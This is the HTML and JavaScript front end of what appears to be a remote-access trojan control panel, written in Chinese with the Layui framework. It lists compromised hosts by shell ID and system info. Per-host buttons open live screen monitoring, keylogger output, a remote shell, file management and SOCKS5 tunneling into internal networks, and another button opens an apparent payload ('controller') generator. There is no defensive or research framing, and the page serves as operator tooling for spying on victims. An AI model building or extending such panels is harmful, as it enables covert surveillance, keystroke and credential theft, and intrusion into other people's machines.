<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>管理系统</title>
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="/static/layui/css/layui.css"  media="all">
    <style>
        .layui-btn{
            border: 1px solid #6e2c2c
        }
    </style>
</head>
<body>
<blockquote class="layui-elem-quote"></blockquote>

<table class="layui-table" lay-data="{height:'full', url:'./api.json', id:'idTest'}" lay-filter="test">
  <thead>
    <tr>
      <th lay-data="{type:'checkbox', fixed: 'left'}"></th>
      <th lay-data="{field:'uid', width:300}">SHELL ID</th>
      <th lay-data="{field:'uptime', width:200}">上线时间</th>
      <th lay-data="{field:'system', minWidth: 500}">系统信息</th>
      <th lay-data="{fixed: 'right' ,width:380, align:'center', toolbar: '#barDemo'}">操作</th>
    </tr>
  </thead>
</table>
<script type="text/html" id="barDemo">
  <a class="layui-btn layui-btn-primary layui-btn-xs" style="background-color: #FD482C" lay-event="screen">屏幕监控</a>
  <a class="layui-btn layui-btn-checked layui-btn-xs" lay-event="key">键盘记录</a>
  <a class="layui-btn layui-btn-warm layui-btn-xs" lay-event="shell">shell</a>
  <a class="layui-btn layui-btn-normal layui-btn-xs" lay-event="file">文件管理</a>
  <a class="layui-btn layui-btn-xs" lay-event="more">更多 <i class="layui-icon layui-icon-down"></i></a>
</script>
<script src="/static/layui/layui.js" charset="utf-8"></script>
<script>
  const table = layui.table;
  const dropdown = layui.dropdown;
  const util = layui.util;
  table.on('tool(test)', function(obj){
    const data = obj.data;
    if(obj.event === 'screen'){
        layer.open({
        type: 2
        ,title: "screen"
        ,closeBtn: 1
        ,anim: 5
        ,moveOut:true
        ,tipsMore:true
        ,maxmin:true
        ,shade: 0
        ,area: ['1600px', '950px']
        ,moveType: 1 //拖拽模式，0或者1
        ,content: './capture/' + data.uid
      });
    }else if(obj.event === 'key'){
        layer.open({
        type: 2
        ,title: "keyboard"
        ,closeBtn: 1
        ,anim: 5
        ,shade: 0
        ,area: ['75%', '850px']
        ,moveType: 1 //拖拽模式，0或者1
        ,content: './key/' + data.uid
      });
    }else if(obj.event === 'shell'){
        layer.open({
        type: 2
        ,title: "shell"
        ,closeBtn: 1
        ,anim: 5
        ,shade: 0
        ,area: ['80%', '560px']
        ,moveType: 1 //拖拽模式，0或者1
        ,content: './shell/' + data.uid
      });
    }else if(obj.event === 'file'){
        layer.open({
        type: 2
        ,title: "文件管理"
        ,closeBtn: 1
        ,anim: 5
        ,shade: 0
        ,area: ['90%', '800px']
        ,moveType: 1 //拖拽模式，0或者1
        ,content: './file/' + data.uid
      });
    }

    if (obj.event === 'more'){
        dropdown.render({
        elem: this //触发事件的 DOM 对象
        ,show: true //外部事件触发即显示
        ,data: [{
          title: '退出'
          ,id: 'exit'
        },{
          title: '内网穿透'
          ,id: 'socks5'
        }]
        ,click: function(menudata){
          if(menudata.id === 'exit'){
            layer.confirm('真的删除行么', function(index){
              obj.del();
              layer.close(index);
            });
          } else if(menudata.id === 'socks5'){
            layer.msg('socks5');
          }
        }
        ,style: 'box-shadow: 1px 1px 10px rgb(0 0 0 / 12%);' //设置额外样式
      })
    }
  });

  //执行
  util.fixbar({
    bar1: '<i>&#xe631;</i>'
      ,css:{right: 150, bottom: 150}
    ,click: function(type){
      console.log(type);
      if(type === 'bar1'){
        layer.open({
        type: 2
        ,title: "控制器生成"
        ,closeBtn: 1
        ,anim: 5
        ,shade: 0
        ,area: ['90%', '800px']
        ,moveType: 1 //拖拽模式，0或者1
        ,content: './make'
      });
      }
    }
  });

  //右键菜单
  const inst = dropdown.render({
    elem: document //也可绑定到 document，从而重置整个右键
    ,trigger: 'contextmenu' //contextmenu
    ,isAllowSpread: false //禁止菜单组展开收缩
    ,style: 'width: 200px' //定义宽度，默认自适应
    ,id: 'options' //定义唯一索引
    ,data: [{
      title: '全局配置'
      ,id: 'test'
    }, {
      title: 'Printing'
      ,id: 'print'
    },{
      title: 'Reload'
      ,id: 'reload'
    },{type:'-'},{
      title: 'menu item 3'
      ,id: '#3'
      ,child: [{
        title: 'menu item 3-1'
        ,id: '#1'
      },{
        title: 'menu item 3-2'
        ,id: '#2'
      },{
        title: 'menu item 3-3'
        ,id: '#3'
      }]
    },{type:'-'},{
      title: 'menu item 4'
      ,id: ''
    },{
      title: 'menu item 5'
      ,id: '#1'
    },{
      title: 'menu item 6'
      ,id: '#1'
    }]
    ,click: function(obj, othis){
      if(obj.id === 'test'){
        layer.msg('click');
      } else if(obj.id === 'print'){
        window.print();
      } else if(obj.id === 'reload'){
        location.reload();
      }
    }
  });
</script>
</body>
</html>
